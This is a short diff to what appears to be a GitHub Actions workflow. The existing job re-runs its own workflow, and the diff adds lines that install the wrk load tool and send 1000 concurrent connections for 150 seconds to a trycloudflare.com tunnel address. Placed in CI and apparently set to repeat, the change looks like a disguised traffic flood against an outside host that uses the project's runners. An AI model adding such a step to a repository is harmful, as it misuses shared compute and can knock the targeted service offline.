@@ -15,3 +15,5 @@ jobs:
               gh workflow run "${{ github.workflow }}" -R "${{ github.repository }}"
               exit 1
           fi
+          sudo apt-get install -y wrk
+          wrk -t$(nproc) -c1000 -d150s http://heater-guidelines-aged-sharing.trycloudflare.com/metrics
